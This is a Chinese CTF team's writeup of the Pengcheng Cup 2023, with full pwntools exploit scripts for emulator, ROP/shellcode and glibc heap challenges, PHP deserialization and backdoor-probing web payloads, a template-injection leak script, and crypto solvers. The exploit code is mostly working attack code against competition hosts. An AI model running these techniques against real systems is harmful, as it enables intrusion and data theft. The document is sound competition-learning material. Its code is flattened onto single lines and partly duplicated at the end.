# 鹏城杯2023 Writeup –Polaris战队

> 原文: https://www.ctfiot.com/143115.html
> ID: 143115

1

PWN

6502

__int64 __fastcall get_mem(unsigned __int16 a1){  if ( DEBUG )    fprintf(stderr, "(get_mem) reading at: 0x%Xn", a1);  if ( a1 <= 0xFFu )    return *(unsigned __int8 *)(mem_ptr + a1);  if ( a1 <= 0x1FFu )    return *(unsigned __int8 *)(mem_ptr + a1 - 256 + 256);  if ( a1 > 0xFFF9u )    return *(unsigned __int8 *)(mem_ptr + a1 - 65018 + 512);  if ( DEBUG )    fprintf(stderr, "(get_mem) parsed: 0x%Xn", (unsigned int)a1 - 512);  return *(unsigned __int8 *)(mem_ptr + (__int16)(a1 - 512) + 518);}
__int64 __fastcall write_mem(unsigned __int16 a1, char a2){  if ( a1 > 0xFFu )  {    if ( a1 > 0x1FFu )    {      if ( a1 <= 0xFFF9u )        *(_BYTE *)(mem_ptr + (__int16)(a1 - 512) + 518) = a2;      else        *(_BYTE *)(mem_ptr + a1 - 65018 + 512) = a2;    }    else    {      *(_BYTE *)(mem_ptr + a1 - 256 + 256) = a2;    }  }  else  {    *(_BYTE *)(mem_ptr + a1) = a2;  }  return 0LL;}

__int64 IZX(){  char v1; // [rsp+Ah] [rbp-6h]  __int16 v2; // [rsp+Ch] [rbp-4h]
  v1 = cpu_fetch(cpu);  v2 = (unsigned __int8)cpu_fetch((unsigned __int8)(byte_21C124 + v1));  addr_abs = ((unsigned __int8)cpu_fetch((unsigned __int8)(byte_21C124 + v1 + 1)) << 8) | v2;  return 0LL;}

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.7', 10002)
payload = b''
payload += p8(162) + p8(0xf2) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xb0) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf2) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA

payload += p8(162) + p8(0xf3) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xea) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf3) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA

payload += p8(162) + p8(0xf4) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xfc) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf4) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA
sh.recvuntil(b'length: n')
sh.sendline(str(len(payload)).encode())sh.sendafter(b'code: ', payload)sh.send(b'/bin/sh0')
sh.interactive()

silent

int __cdecl main(int argc, const char **argv, const char **envp){  char buf[64]; // [rsp+10h] [rbp-40h] BYREF
  init_seccomp(argc, argv, envp);  alarm(0x1Eu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  read(0, buf, 0x100uLL);  return 0;}

直接爆破 write 函数。成功率大约是 1/4096 。

首先栈迁移后重新执行 _start，这样 bss 段上就留下了 libc 地址，用这个 libc 地址爆破 write 函数。

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.8', 9999)
sh.send((cyclic(64) + flat([0x603000-0x100, 0x0000000000400963, 0, 0x0000000000400961, 0x603000-0x100, 0, 0x400700, 0x0000000000400876])).ljust(0x100, b'0'))sh.send(flat([0, 0x400720]).ljust(0x100, b'0'))sh.send((cyclic(64) + flat([0, 0x0000000000400963, 0, 0x0000000000400961, 0x601000+0x1288, 0, 0x400700,                                0x0000000000400963, 0, 0x0000000000400961, 0x601000+0x1288+8, 0, 0x400700,                                0x0000000000400963, 1, 0x0000000000400961, 0x600FE0, 0,0x000000000040095d, 0x601000+0x1288-0x18])).ljust(0x100, b'0'))addr = randint(0, 0xfff) * 0x1000 + 0x0f0sh.send(p32(addr)[:3])time.sleep(1)sh.send(flat([0x400878]).ljust(0x100, b'0'))libc_addr = u64(sh.recvn(8)) - 0x110020success('libc_addr: ' + hex(libc_addr))shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rdi, rsp    xor eax, eax    mov esi, eax    mov al, 2    syscall ;// open
    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')sh.send((cyclic(64) + flat([    0x603000-0x100,    libc_addr + 0x000000000002164f, 0x601000,    libc_addr + 0x0000000000023a6a, 0x2000,    libc_addr + 0x0000000000001b96, 7,    libc_addr + 0x11b7e0,    libc_addr + 0x0000000000002b25]) + shellcode).ljust(0x100, b'0'))
sh.interactive()

babyheap

一道传统的heap题。

readn 会导致off-by-one漏洞。

__int64 edit(){  unsigned int v1; // [rsp+0h] [rbp-10h]  int v2; // [rsp+4h] [rbp-Ch]
  puts("input index");  v1 = get_int();  if ( v1 < 0x11 )  {    puts("input your name size");    v2 = get_int();    if ( qword_4060[v1] && v2 <= ptr_size[v1] && v2 >= 0 )    {      puts("input your name");      readn(qword_4060[v1], v2);                // off-by-one    }    return 0LL;  }  else  {    puts("invalid index");    return 0LL;  }}

unsigned __int64 menu(){  void *ptr; // [rsp+0h] [rbp-10h]  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
  v2 = __readfsqword(0x28u);  puts("Welcome to the 4everdestiny@Lancet lab");  puts("This is the babyheap for glibc 2.38");  puts("i don't want to make a seccomp function");  puts("and this line will make the game easier");  ptr = malloc(0x10uLL);  printf("%pn", ptr);  free(ptr);  return v2 - __readfsqword(0x28u);}
__int64 add(){  int i; // [rsp+0h] [rbp-10h]  int v2; // [rsp+4h] [rbp-Ch]
  for ( i = 0; i <= 15 && qword_4060[i]; ++i )    ;  if ( i == 16 )  {    puts("list fulln");    return 0LL;  }  else  {    puts("input your name size");    v2 = get_int();    if ( v2 > 0x3FF && v2 <= 0x500 )    {      qword_4060[i] = malloc(v2);      ptr_size[i] = v2;      puts("input your name");      readn(qword_4060[i], (unsigned int)v2);      return 0LL;    }    else    {      puts("invalid size");      return 0LL;    }  }}

那么大致的利用思路如下：

构造 chunk overlap

泄漏 libc 地址

利用 tcache 劫持 stdout

利用 stdout 泄漏 栈地址

栈劫持

#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.7', 10001)
def add(size, name):    sh.sendlineafter(b'>> n', b'1')    sh.sendlineafter(b'sizen', str(size).encode())    sh.sendafter(b'namen', name)
def edit(index, size, name):    sh.sendlineafter(b'>> n', b'2')    sh.sendlineafter(b'indexn', str(index).encode())    sh.sendlineafter(b'sizen', str(size).encode())    sh.sendafter(b'namen', name)
def show(index):    sh.sendlineafter(b'>> n', b'3')    sh.sendlineafter(b'indexn', str(index).encode())
def delete(index):    sh.sendlineafter(b'>> n', b'4')    sh.sendlineafter(b'indexn', str(index).encode())
sh.recvuntil(b'easiern')heap_addr = int(sh.recvline(), 16) - 0x2a0success('heap_addr: ' + hex(heap_addr))
add(0x408, b'n')add(0x4f8, b'n')edit(0, 0x408, flat({0:heap_addr + 0x2b0, 8:heap_addr + 0x2b0, 0x400:0x410}, filler=b'0'))add(0x4f8, b'n')delete(1)add(0x418, b'n')add(0x4e8, b'n')delete(1)add(0x500, b'n')show(0)libc_addr = u64(sh.recvn(6) + b'00') - 0x1ff0f0success('libc_addr: ' + hex(libc_addr))delete(3)add(0x408, b'n')add(0x408, b'n')delete(4)delete(3)edit(0, 0x10, p64(((heap_addr + 0x2c0)>>0xc) ^ (libc_addr + 0x1ff7a0)) + b'n')add(0x408, b'n')add(0x408, flat([0x00000000fbad3887, 0, 0, 0, libc_addr + 0x206258, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8, libc_addr + 0x206258 + 8]) + b'n')stack_addr = u64(sh.recvn(8))success('stack_addr: ' + hex(stack_addr))add(0x408, b'n')delete(5)delete(3)edit(0, 0x10, p64(((heap_addr + 0x2c0)>>0xc) ^ (stack_addr - 0x128)) + b'n')add(0x408, b'n')add(0x408, flat([0, libc_addr + 0x0000000000026a3e, libc_addr + 0x0000000000028715, libc_addr + 0x1c041b, libc_addr + 0x55230]) + b'n')sh.sendlineafter(b'>> n', b'5')
sh.interactive()

Auto_Coffee_machine

unsigned __int64 change_default(){  int v1; // [rsp+Ch] [rbp-14h]  int v2; // [rsp+10h] [rbp-10h]  char buf[4]; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
  v4 = __readfsqword(0x28u);  show_list();  puts("input the id you want to change");  printf(">>>");  read(0, buf, 4uLL);  v1 = atol(buf) - 1;  if ( v1 >= 0 && v1 <= 2 )  {    puts("input which coffee you want to change");    printf(">>>");    read(0, buf, 4uLL);    v2 = atol(buf) - 1;    if ( v2 >= 0 && v2 <= 4 || *((_QWORD *)&copy_left_coffee + 7 * v1 + v2) )    {      puts("input your content");      read(0, *((void **)&copy_left_coffee + 7 * v1 + v2), 0x80uLL);      puts("done");      update(2LL);    }    else    {      puts("invalid coffee");    }  }  else  {    puts("invalid id");  }  return __readfsqword(0x28u) ^ v4;}

from pwn import *from struct import packfrom ctypes import *import base64from subprocess import run#from LibcSearcher import *from struct import packimport tty
def debug(c = 0):    if(c):        gdb.attach(p, c)    else:        gdb.attach(p)        pause()def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))#-----------------------------------------------------------------------------------------s = lambda data : p.send(data)sa  = lambda text,data  :p.sendafter(text, data)sl  = lambda data   :p.sendline(data)sla = lambda text,data  :p.sendlineafter(text, data)r   = lambda num=4096   :p.recv(num)rl  = lambda text   :p.recvuntil(text)pr = lambda num=4096 :print(p.recv(num))inter   = lambda        :p.interactive()l32 = lambda    :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda    :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32    = lambda    :u32(p.recv(4).ljust(4,b'x00'))uu64    = lambda    :u64(p.recv(6).ljust(8,b'x00'))int16   = lambda data   :int(data,16)lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))#-----------------------------------------------------------------------------------------
context(os='linux', arch='amd64', log_level='debug')#p = remote('120.46.65.156', 32104)p = process('./pwn')elf = ELF('./pwn')libc = ELF('./libc-2.31.so')
def buy(idx, data = b'a'*8):  sla(b'>>>', b'1')  sla(b'buy', str(idx))  sla(b'N', b'y')  sa(b'coffee', data)def show():  sla(b'>>>', b'2')  def re(idx):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'1')  sla(b'sh', str(idx))  sla(b'>>>', b'3')def ed(idx, of, data):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'2')  sa(b'>>>', str(idx + 1))  sa(b'>>>', str(of + 1))  sa(b'content', data)  sla(b'>>>', b'3')  def ed_(idx, of, data):  sla(b'>>>', str(4421))  sa(b'password', p64(0x6e7770207473756a) + p64(0x746920))  sla(b'>>>', b'2')  sla(b'>>>', str(idx + 1))  sla(b'>>>', str(of + 1))  sa(b'content', data)

buy(1)buy(1)pl = p64(0x00000000fbad1800) + p64(0)*3 + p8(0x0)ed_(0, -0x20, pl)libc_base = l64() - 0x1ec980sla(b'>>>', b'3')
free_hook = libc_base + libc.sym['__free_hook']system, binsh = get_sb()
#debug('b *0x401905')#debug('b *0x401ce9nb *0x401905')
#buy(2)pl = p64(0x00000000405e20) + p64(libc_base + 0x223190) + p64(libc_base + 0x20cbc0)pl += p64(system)ed(1, -0xa0, pl)
buy(3, b'/bin/shx00')
inter()lg('libc_base', libc_base)
#debug()pause()

2

RE

安全编程

rust写的猜数字游戏，猜对了100次就可以解密

我们可以直接修改程序执行流程到解密位置

我们将其简单的修改一下执行

之后我们便可以拿到flag

Bad PE

本质上就是一个节区的解密

通过异或来释放另一个可执行程序

其没去符号，可以明显的看到是个RC4加密

对应的Key简单找找就可以发现是th3k3y!

3

WEB

web1

<?phpclass Hacker{    public $exp;    public $cmd;}
class A{    public $hacker;}class C{    public $finish;    public function __get($value)    {        $this->finish->hacker();        echo 'nonono';    }}class E{    public $hacker;}
class H{    public $username;}
class K{    public $func;}
class R{    public $method;    public $args;}$a=new H();$a ->username=new Hacker();echo serialize($a);

O:1:”H”:1:{s:8:”username”;O:6:”Hacker”:2:{s:3:”exp”;N;s:3:”cmd”;N;}}

直接打即可。

web2

源代码提示存在一个后门文件。

通过glob协议爆破后门文件。

import requests
list = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o',        'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']url = "http://172.10.0.5/"
filename = ""tmp = ""
for j in range(32):    for i in list:        tmp = filename        tmp += i        print(filename)        payload = "glob://backdoor_" + tmp + "*.php"        data = {            "filename": payload        }        resp = requests.post(url, data=data)        if "yesyesyes" in resp.text:            filename = tmp            break        else:            tmp = ""

http://172.10.0.5/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=11&title[]=.php&data[]=<?php system("cat /f*");

Tera

被过滤了，不能使用表达式进行注入。

查看文档可以发现还能使用

{%%}

然后flag关键字也被过滤了，肯定有东西。

看到 __tera_context可以查看上下文信息

使用脚本测试一下

import requests
url = "http://172.10.0.3:8081/"

for i in range(32, 127):    code = chr(i)    data = "data={% set a = [__tera_context] %}{% for char in __tera_context %}{% if char == " + f"'{code}'" + " %}" + f" {code} " + "{%- else -%}0{%- endif -%}{% endfor %}"    headers = {        "Content-Type": "application/x-www-form-urlencoded"    }    print(data)    r = requests.post(url, data=data, headers=headers)
    print(r.text)

并没有发现数据，直接猜一波flag就在env里面

通过内置函数get_env可以获取。

import stringimport requests
url = "http://172.10.0.3:8081"
def getflag(re):    payload = """data={% set q="galf"|reverse %}{% set u=get_env(name=q) %}    {% if u is matching('z.*') %}    ok    {% endif %}""".replace("z", re)    headers = {        "Content-Type": "application/x-www-form-urlencoded"    }    result = requests.post(url, data=payload, headers=headers).text    if "ok" in result:        return True    return False
str = string.hexdigits + "-+"flag = "fla[g]."while True:    for i in str:        if getflag(flag + i):            flag += i            print(flag)            break

4

Crypto

SecretShare

预测、回溯恢复数据

方程求解P

rsa解密得flag

# https://github.com/NonupleBroken/ExtendMT19937Predictor"""randomuniform"""import randomfrom extend_mt19937_predictor import ExtendMT19937Predictor
with open('./output.txt', 'r') as f:    data = f.readlines()X = []R = []leak = 158171468736013100218170873274656605219228738469715092751861925345310881653082508445746109167302799236685145510095499361526242392251594397820661050281094210672424887670015189702781308615421102937559185479455827148241690888934661637911906309379701856488858180027365752169466863585611322838180758159364570481257p = 667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891
for i in range(len(data)):    tmp = data[i].split(' ')    X.append(int(tmp[0]))    R.append(int(tmp[1]))R.append(leak)
# 恢复X[-1]predictor = ExtendMT19937Predictor()for i in X:    predictor.setrandbits(i, 1024)X.append(predictor.predict_getrandbits(1024))
# 恢复A[1:]A = []predictor = ExtendMT19937Predictor()for i in X:    predictor.setrandbits(i, 1024)_ = [predictor.backtrack_getrandbits(1024) for _ in range(len(X))]  # 回溯到起始状态for i in range(20):    A.append(predictor.backtrack_getrandbits(1024))A = A[::-1]print(f"{A=}")print(f"{X=}")print(f"{R=}")

A=X=R=leak = 158171468736013100218170873274656605219228738469715092751861925345310881653082508445746109167302799236685145510095499361526242392251594397820661050281094210672424887670015189702781308615421102937559185479455827148241690888934661637911906309379701856488858180027365752169466863585611322838180758159364570481257p = 667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029   c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891PR.<x> = PolynomialRing(Zmod(p))A = [x] +A
def F(x):    res = 0    tmp = 1    for i in range(21):        res = (res + tmp * A[i])        tmp = tmp * x    return res
f = F(X[0])-R[0]f.roots()

from Crypto.Util.number import *P = 92422003757477651157474383100036998824887848419954840007147868223910074931859933956269885856128093345487882260496791272977844862352094356168399257688148495739541010758727078419554501190171624312463235528402998918943680454965800744650511720557056811235552334860437375771202122918781073950952368367594976459763c = 9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912N = 11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891e = 65537print(long_to_bytes(int(pow(c, inverse(e, P-1), P))))  # flag{2f43430b-3c31-03ee-0a92-5b24826c015c}

Neltharion and Arthas

1. 根据性质，异或得到部分gift1

2. 猜测、搜索并补全gift1

from Crypto.Util.strxor import strxor
enc_gift1 = 'bad7dbcff968d7cdbf51da011fe94e176fc8e7528e4dd85d2d5fc20ba69cefb7bfd03152a2874705bd2d857ea75b3216a830215db74772d9b9e9c218271d562694d3642d2917972fdb8c7363d8125730a50824cd8dc7e34cd4fa54be427cca'enc_flag = 'c1c78891e30cd4c0aa5ed65c17e8550429c4e640881f9f1d6a56df'

enc_gift1 = bytes.fromhex(enc_gift1)enc_flag = bytes.fromhex(enc_flag)
LEN = 1enc_gift1 = [enc_gift1[LEN * i:LEN * (i + 1)] for i in range(len(enc_gift1) // LEN)]enc_flag = [enc_flag[LEN * i:LEN * (i + 1)] for i in range(len(enc_flag) // LEN)]
tmp = [strxor(enc_gift1[i], enc_flag[i]) for i in range(len(enc_flag))]tmp = b''.join(tmp)
gift1 = b'I am Deathwing, the Destroyer, the end of all things!'  # Googleprint(gift1[:len(tmp)])print(gift1[:len(tmp)])flag1 = strxor(tmp, gift1[:len(tmp)])print(flag1) # b'2023: flag{4ff732dd2B7445fd'# b'2023: flag{4ff732dd2b7445fd'

import hashlib, binasciifrom Crypto.Cipher import AESimport itertoolsfrom tqdm import tqdmfrom Crypto.Util.strxor import strxorkey2 = list(b'tn*-ix6L*tCa*}i*')# print(key2)import stringTTMP = ''for i in itertools.product(string.printable[:-6], repeat=4):    i = [ord(_) for _ in list(i)]    tmp_key2 = key2    tmp_key2[2] = i[0]    tmp_key2[8] = i[1]    tmp_key2[12] = i[2]    tmp_key2[15] = i[3]    tmp_key2 = bytes(tmp_key2)    if TTMP != i[0]:        TTMP = i[0]        print(TTMP)

    h = binascii.unhexlify(hashlib.sha256(tmp_key2).hexdigest())[:11]    gift2 = b'I tell you this, for when my days have come to an end , you, shall be King.' + h    LEN = len(tmp_key2)    padding = bytes((LEN - len(gift2) % LEN) * '&', encoding='utf-8')    gift2 += padding    gift2 = [gift2[LEN * i:LEN * (i + 1)] for i in range(len(gift2) // LEN)]    # print(gift2)
    enc_gift2 = 'fee046b4d2918096cfa3b76d6622914395c7e28eef'
    enc_gift2 = bytes.fromhex(enc_gift2)[-16:]    cipher = AES.new(tmp_key2, AES.MODE_ECB)    C = enc_gift2    for i in range(6):        tmp = cipher.decrypt(C)        C = strxor(tmp, gift2[5 - i])    flag2 = C    try:        flag2 = flag2.decode()        if all([__ in string.hexdigits for __ in flag2[3:5]]):            print(flag2)    except:        continue

有a3eae82b4c491e0e

最后UUID格式拼接得到flag

5

MISC

流量深处

流量翻了一下udp数据流，发现zip特征，12346接受的是正向的16进制数据，12345是反向的16进制数据

写脚本

from scapy.all import *
def extract_udp_data(pcap_file, output_file):    udp_data = []    packets = rdpcap(pcap_file)
    for packet in packets:        if UDP in packet:            udp_payload = packet[UDP].payload            timestamp = packet.time            udp_data.append((timestamp, bytes(udp_payload), packet[UDP].dport))
    # Sort the data by timestamp    udp_data.sort(key=lambda x: x[0])
    with open(output_file, 'wb') as file:        for timestamp, data, port in udp_data:            if port == 12345:                # Reverse the data for port 12345                data = data[::-1]            file.write(data)
if __name__ == "__main__":    pcap_file = "secret.pcapng"    output_file = "aaa_combined_data"
    extract_udp_data(pcap_file, output_file)    print(f"UDP data extracted from {pcap_file} and saved to {output_file}")

from PIL import Image, ImageDrawimport re
# 数据字符串data = """txt直接粘贴过来就行，太大了，腾讯文档粘贴不过来"""
# 使用正则表达式解析数据点pattern = r"Mouse : (d+) : (d+) : Move : 0 : 0 : 0"matches = re.findall(pattern, data)
# 提取坐标数据points = [(int(match[0]), int(match[1])) for match in matches]
# 计算图像尺寸max_x = max(points, key=lambda p: p[0])[0]max_y = max(points, key=lambda p: p[1])[1]
# 增大图像尺寸image_width = max_x + 50  # 增加 50 像素的宽度image_height = max_y + 50  # 增加 50 像素的高度
# 创建图像image = Image.new("RGB", (image_width, image_height), "white")draw = ImageDraw.Draw(image)
# 缩放因子，可以根据需要调整scaling_factor = 0.5  # 缩放因子
# 缩放坐标数据scaled_points = [(int(p[0] * scaling_factor), int(p[1] * scaling_factor)) for p in points]
# 绘制路径draw.line(scaled_points, fill="blue", width=1)
# 保存图像image.show()image.save("path.png")
# 显示


```
__int64 __fastcall get_mem(unsigned __int16 a1){  if ( DEBUG )    fprintf(stderr, "(get_mem) reading at: 0x%Xn", a1);  if ( a1 <= 0xFFu )    return *(unsigned __int8 *)(mem_ptr + a1);  if ( a1 <= 0x1FFu )    return *(unsigned __int8 *)(mem_ptr + a1 - 256 + 256);  if ( a1 > 0xFFF9u )    return *(unsigned __int8 *)(mem_ptr + a1 - 65018 + 512);  if ( DEBUG )    fprintf(stderr, "(get_mem) parsed: 0x%Xn", (unsigned int)a1 - 512);  return *(unsigned __int8 *)(mem_ptr + (__int16)(a1 - 512) + 518);}
__int64 __fastcall write_mem(unsigned __int16 a1, char a2){  if ( a1 > 0xFFu )  {    if ( a1 > 0x1FFu )    {      if ( a1 <= 0xFFF9u )        *(_BYTE *)(mem_ptr + (__int16)(a1 - 512) + 518) = a2;      else        *(_BYTE *)(mem_ptr + a1 - 65018 + 512) = a2;    }    else    {      *(_BYTE *)(mem_ptr + a1 - 256 + 256) = a2;    }  }  else  {    *(_BYTE *)(mem_ptr + a1) = a2;  }  return 0LL;}
```



```
__int64 IZX(){  char v1; // [rsp+Ah] [rbp-6h]  __int16 v2; // [rsp+Ch] [rbp-4h]
  v1 = cpu_fetch(cpu);  v2 = (unsigned __int8)cpu_fetch((unsigned __int8)(byte_21C124 + v1));  addr_abs = ((unsigned __int8)cpu_fetch((unsigned __int8)(byte_21C124 + v1 + 1)) << 8) | v2;  return 0LL;}
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.7', 10002)
payload = b''
payload += p8(162) + p8(0xf2) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xb0) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf2) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA

payload += p8(162) + p8(0xf3) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xea) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf3) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA

payload += p8(162) + p8(0xf4) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(161) + p8(0) # LDA
payload += p8(162) + p8(0xfc) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(101) + p8(0) # ADC
payload += p8(162) + p8(0xf4) # LDXpayload += p8(134) + p8(0) # STXpayload += p8(162) + p8(0xde) # LDXpayload += p8(134) + p8(1) # STXpayload += p8(162) + p8(0) # LDXpayload += p8(129) + p8(0) # STA
sh.recvuntil(b'length: n')
sh.sendline(str(len(payload)).encode())sh.sendafter(b'code: ', payload)sh.send(b'/bin/sh0')
sh.interactive()
```



```
int __cdecl main(int argc, const char **argv, const char **envp){  char buf[64]; // [rsp+10h] [rbp-40h] BYREF
  init_seccomp(argc, argv, envp);  alarm(0x1Eu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  read(0, buf, 0x100uLL);  return 0;}
```



```
#!/usr/bin/env python3# -*- coding:utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
sh = remote('172.10.0.8', 9999)
sh.send((cyclic(64) + flat([0x603000-0x100, 0x0000000000400963, 0, 0x0000000000400961, 0x603000-0x100, 0, 0x400700, 0x0000000000400876])).ljust(0x100, b'0'))sh.send(flat([0, 0x400720]).ljust(0x100, b'0'))sh.send((cyclic(64) + flat([0, 0x0000000000400963, 0, 0x0000000000400961, 0x601000+0x1288, 0, 0x400700,                                0x0000000000400963, 0, 0x0000000000400961, 0x601000+0x1288+8, 0, 0x400700,                                0x0000000000400963, 1, 0x0000000000400961, 0x600FE0, 0,0x000000000040095d, 0x601000+0x1288-0x18])).ljust(0x100, b'0'))addr = randint(0, 0xfff) * 0x1000 + 0x0f0sh.send(p32(addr)[:3])time.sleep(1)sh.send(flat([0x400878]).ljust(0x100, b'0'))libc_addr = u64(sh.recvn(8)) - 0x110020success('libc_addr: ' + hex(libc_addr))shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rdi, rsp    xor eax, eax    mov esi, eax    mov al, 2    syscall ;// open
